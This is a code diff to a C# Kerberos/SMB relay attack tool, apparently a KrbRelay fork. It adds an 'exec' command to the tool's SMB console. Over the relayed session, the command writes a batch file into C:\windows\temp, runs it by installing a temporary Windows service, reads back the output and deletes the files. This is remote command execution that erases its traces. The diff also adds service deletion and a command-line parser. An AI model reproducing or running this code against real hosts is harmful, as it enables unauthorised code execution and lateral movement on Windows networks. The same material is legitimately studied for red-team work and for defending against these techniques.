@@ -6,6 +6,9 @@ using System.IO;
 using System.Net.Sockets;
 using System.Text;
 using System;
+using System.Threading;
+using System.Linq;
+using System.Text.RegularExpressions;
 
 
 
@@ -210,7 +213,23 @@ namespace KrbRelay.Clients.Attacks.Smb
             receivedData = receivedData.Replace("\n", "");
             return receivedData;
         }
-        public static void smbConsole(SMB2Client smbClient, Socket clientSocket = null, string share = "ipc$")
+        public static void ExecComnmand(SMB2Client smbClient,string arg1)
+        {
+            string randomStr = new string(Enumerable.Range(0, 8).Select(_ => (char)('a' + new Random().Next(26))).ToArray());
+            ISMBFileStore fileStore = smbClient.TreeConnect("C$", out var status);
+            string srvcmd = arg1 + " > c:\\windows\\temp\\" + randomStr + ".txt";
+            
+            writeFile(smbClient, fileStore, "windows\\temp\\" + randomStr + ".bat", Encoding.UTF8.GetBytes(srvcmd));
+            Attacks.Smb.ServiceManager.serviceInstall(smbClient, randomStr, "c:\\windows\\system32\\cmd.exe /k start c:\\windows\\temp\\" + randomStr + ".bat");
+            Attacks.Smb.ServiceManager.serviceDelete(smbClient, randomStr);
+            Thread.Sleep(500);
+            readFile(smbClient, fileStore, "windows\\temp\\" + randomStr + ".txt", out byte[] file3);
+            Console.WriteLine("[*] Output of command: {0}", arg1);
+            Output(Encoding.ASCII.GetString(file3));
+            deleteFile(fileStore, "windows\\temp\\" + randomStr + ".bat");
+            deleteFile(fileStore, "windows\\temp\\" + randomStr + ".txt");
+        }
+            public static void smbConsole(SMB2Client smbClient, Socket clientSocket = null, string share = "ipc$")
         {
             bool exit = false;
             string input = "";
@@ -294,6 +313,20 @@ namespace KrbRelay.Clients.Attacks.Smb
                                 break;
                             case "exit":
                                 exit = true;
+                                break;
+                            case "exec":
+                                string randomStr = new string(Enumerable.Range(0, 8).Select(_ => (char)('a' + new Random().Next(26))).ToArray());
+
+                                string srvcmd = arg1 + " > c:\\windows\\temp\\" + randomStr + ".txt";
+                                writeFile(smbClient, fileStore, "windows\\temp\\" + randomStr + ".bat", Encoding.UTF8.GetBytes(srvcmd));
+                                Output(Attacks.Smb.ServiceManager.serviceInstall(smbClient, randomStr, "c:\\windows\\system32\\cmd.exe /k start c:\\windows\\temp\\" + randomStr + ".bat"));
+                                Attacks.Smb.ServiceManager.serviceDelete(smbClient, randomStr);
+                                Thread.Sleep(500);
+                                readFile(smbClient, fileStore, "windows\\temp\\" + randomStr + ".txt", out byte[] file3);
+
+                                Output(Encoding.ASCII.GetString(file3));
+                                deleteFile(fileStore, "windows\\temp\\" + randomStr + ".bat");
+                                deleteFile(fileStore, "windows\\temp\\" + randomStr + ".txt");
                                 break;
 
                             default:
@@ -557,6 +590,29 @@ namespace KrbRelay.Clients.Attacks.Smb
             catch { isConnected = false; }
             return receivedData;
         }
+        public static string[] ParseCommandLine(string input)
+        {
+            var results = new System.Collections.Generic.List<string>();
+
+            // Match double-quoted strings OR individual non-space segments
+            var matches = Regex.Matches(input, "\"([^\"]+)\"|\\S+");
+
+            foreach (Match match in matches)
+            {
+                if (match.Groups[1].Success)
+                {
+                    // Quoted label
+                    results.Add(match.Groups[1].Value);
+                }
+                else
+                {
+                    // Unquoted label
+                    results.Add(match.Value);
+                }
+            }
+
+            return results.ToArray();
+        }
         public void smbConsole(SMB2Client smbClient, Socket cSocket = null, string share = "ipc$")
         {
             bool exit = false;
@@ -573,10 +629,25 @@ namespace KrbRelay.Clients.Attacks.Smb
                     {
                         Output("SMB>");
                         input = Input();
+                        
+                        string[] parts = ParseCommandLine(input);
+                        string cmd = parts[0];
+                        string arg1 = "";
+                        string arg2 = "";
+                        if (parts.Length == 0)
+                            continue;
+                        cmd = parts[0];
+                        if (cmd == "")
+                            continue;
+                        if (parts.Length>=2)
+                            arg1 = parts[1];
+                        //string cmd = input.Split(' ')[0];
+                        if (parts.Length == 3)
+                        {
 
-
-
-                        string cmd = input.Split(' ')[0];
+                            arg2 = parts[2];
+                        }
+                        /*
                         string arg1 = "";
                         string arg2 = "";
                         try
@@ -586,7 +657,7 @@ namespace KrbRelay.Clients.Attacks.Smb
                         }
                         catch { }
 
-
+                        */
                         switch (cmd)
                         {
                             case "ls":
@@ -632,9 +703,30 @@ namespace KrbRelay.Clients.Attacks.Smb
                                 Output(Attacks.Smb.ServiceManager.serviceInstall(smbClient, arg1, arg2));
 
                                 break;
+                            case "exec":
+                                string randomStr = new string(Enumerable.Range(0, 8).Select(_ => (char)('a' + new Random().Next(26))).ToArray());
+
+                                string srvcmd = arg1 + " > c:\\windows\\temp\\"+randomStr + ".txt";
+                                writeFile(smbClient, fileStore, "windows\\temp\\"+ randomStr+".bat" , Encoding.UTF8.GetBytes(srvcmd));
+                                Output(Attacks.Smb.ServiceManager.serviceInstall(smbClient, randomStr, "c:\\windows\\system32\\cmd.exe /k start c:\\windows\\temp\\" + randomStr + ".bat"));
+                                Attacks.Smb.ServiceManager.serviceDelete(smbClient, randomStr);
+                                Thread.Sleep(500);
+                                readFile(smbClient, fileStore, "windows\\temp\\"+ randomStr + ".txt", out byte[] file3);
+                                
+                                Output(Encoding.ASCII.GetString(file3));
+                                deleteFile(fileStore, "windows\\temp\\" + randomStr + ".bat");
+                                deleteFile(fileStore, "windows\\temp\\"+ randomStr + ".txt");
+
+                                //Output(Attacks.Smb.ServiceManager.serviceStart(smbClient, "blabla"));
+                                break;
                             case "service-start":
 
                                 Output(Attacks.Smb.ServiceManager.serviceStart(smbClient, arg1));
+
+                                break;
+                            case "service-delete":
+
+                                Output(Attacks.Smb.ServiceManager.serviceDelete(smbClient, arg1));
 
                                 break;
                             case "exit":
